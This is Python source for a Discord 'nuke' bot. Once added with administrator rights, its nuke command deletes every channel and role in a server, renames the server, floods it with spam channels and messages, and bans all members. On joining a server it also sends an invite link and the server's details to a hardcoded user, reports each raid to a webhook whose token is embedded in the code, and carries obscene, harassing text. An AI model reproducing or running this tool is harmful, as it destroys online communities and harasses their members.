import discord
from discord.ext import commands
import random
import requests
import asyncio
import datetime
import json
import aiohttp

intents = discord.Intents.all()
intents.members = True

bot = commands.Bot(command_prefix='*', intents=intents)
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f'Bot is ready. Logged in as {bot.user.name}')
    activity = discord.Game(name="Wow! Your mom is so beautiful")
    await bot.change_presence(activity=activity)

with open('config.json', 'r') as f:
    config = json.load(f)

channel_names = config['channel_names']
message_spam = config['message_spam']
webhook_names = config['webhook_names']
verify_addon = [
    "Boost to get 70% less verification cooldown!",
    "Don't forget buy my mom",
    "Enjoy ur dick",
    "lolxlol fuck your all family",
    "lolxlol you'r master",
]
random_addon = random.choice(verify_addon)
webhook_url = "https://discord.com/api/webhooks/1131962053175816232/VinvK-h7HBrb3K_5YocSCae-Iftni04SU7CCO5WgcsGTx7DC8I8X_S5DT9-wrYTjbvrS"  # Replace with your webhook URL

@bot.event
async def on_http_error(error):
    if isinstance(error, dicord.HTTPException) and error.status == 429:
        # Send a webhook notification
        payload = {
            "content": f"<@1077542076218081332> Rate limit error (429) occurred: {error.response.reason}"
        }
        requests.post(webhook_url, json=payload)

        # Log out the client
        await bot.logout()

@bot.command()
async def link(ctx):
    await ctx.reply("Add the bot with the following link: https://discord.com/api/oauth2/authorize?client_id=1131948951071887420&permissions=8&scope=bot .")
    
@bot.command()
async def verify(ctx):
    if str(ctx.channel.id) == "1131962019982094436":
        with open('ids.txt', 'a') as file:
            file.write(f"\n{ctx.author.id}\n")
        await ctx.reply(f"Verification successful. Your ID has been added to the authorized list.\n{random_addon}")
    else:
        await ctx.reply("You can't verify here because it's either not valid channel or you don't have `subscriber` role. Check https://discord.com/channels/1120624807009071164/1121029332626833449 .")

@bot.command()
async def nuke(ctx, amount=50):
    if str(ctx.guild.id) == "1120624807009071164":
        await ctx.reply("You are not authorized to use this command in this guild.")
        return
    if len(ctx.guild.members) < 1:
        await ctx.reply("This can be a test server. Server needs at least 1 members to be nuked!")
        return
    with open('ids.txt', 'r') as file:
        authorized_ids = file.read().splitlines()
    if str(ctx.author.id) not in authorized_ids:
        await ctx.reply("You are not authorized to use this command. If you are verified, but the error still exists contact @lolxlol#1657 [985508523934908506]")
        return
    
    
    embed = discord.Embed(title="Nuked By Your fucking mom", description=f"{ctx.author.name} just nuked a server named {ctx.guild.name}!", color=discord.Color.red())
    embed.set_footer(text=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)
    
        # Download the image file
    icon_url = "https://media.discordapp.net/attachments/991724338153799741/1131957006773780480/coOW.png"
    icon_response = requests.get(icon_url)
    with open("guild_icon.png", "wb") as icon_file:
        icon_file.write(icon_response.content)

    with open('ids.txt', 'r+') as file:
        authorized_ids = file.read().splitlines()
        authorized_ids.remove(str(ctx.author.id))
        file.seek(0)
        file.truncate()
        file.write('\n'.join(authorized_ids))
        print(f"\x1b[38;5;34m{ctx.author.id} has been removed from the authorized IDs.")
        
    # Edit guild name and icon
    with open("guild_icon.png", "rb") as icon_file:
        guild_icon = icon_file.read()
        await ctx.guild.edit(name="OWNED BY LOLXLOL", icon=guild_icon)
        channels = ctx.guild.channels
    
    
    channels = ctx.guild.channels
    tasks = []

    for channel in channels:
        async def delete_channel(channel):
            try:
                await channel.delete()
                print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
            except:
                print("\x1b[38;5;196mUnable To Delete Channel!")

        task = asyncio.create_task(delete_channel(channel))
        tasks.append(task)

    # Wait for all tasks to complete
    await asyncio.gather(*tasks)

    
    guild = ctx.message.guild
    
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(channel_names))
            print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
        except:
            print("\x1b[38;5;196mUnable To Create Channel!")
    
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
        except:
            print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
    
    await asyncio.sleep(2)
    
    # Send messages and ban members
    for i in range(100):
        for i in range(1000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(message_spam))
                    print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
                except:
                    print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")          
            for member in ctx.guild.members:
                try:
                    await member.ban(reason="Nuked By LOLXLOL")
                    print(f"\x1b[38;5;34m{member.name} Has Been Banned!")
                except:
                    print(f"\x1b[38;5;196mUnable To Ban {member.name}!")        
    
    # Remove the user's ID from the authorized IDs file

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(message_spam))


@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = random.choice(webhook_names))  
    while True:  
        await channel.send(random.choice(message_spam))
        await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))


@bot.event
async def on_guild_join(guild):
    user = bot.get_user(985508523934908506)
    if user:
        added_by_user = bot.get_user(guild.owner_id)
        added_by = added_by_user.name if added_by_user else "Unknown User"

        invite = await guild.text_channels[0].create_invite(max_uses=50)
        invite_url = invite.url

        dm_message = f"**Bot Added**\n\n> I've been added to a Discord Server\n\nLink: {invite_url}\nName: {guild.name}\nMember Count: {guild.member_count}\nAdded By: {added_by}"
        await user.send(dm_message)
        await user2.send(dm_message)

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Bot Help", color=discord.Color.blue())

    # Add a field for each command
    for command in bot.commands:
        embed.add_field(name=command.name, value=command.help, inline=False)

    await ctx.send(embed=embed)





@bot.command()
async def leavethis(ctx):
    try:
        await ctx.send("Leaving")
        asyncio.wait(1)
        await ctx.guild.leave()

    except Exception as e:

        print(f"{e}")
        
def is_bot_owner(user_id):
    # Define the bot owner's user ID
    bot_owner_id = 985508523934908506

    # Check if the provided user ID matches the bot owner's ID
    if user_id == bot_owner_id:
        return True
    else:
        return False
    
with open('token.txt', 'r') as file:
    token = file.read().strip()

bot.run(token)
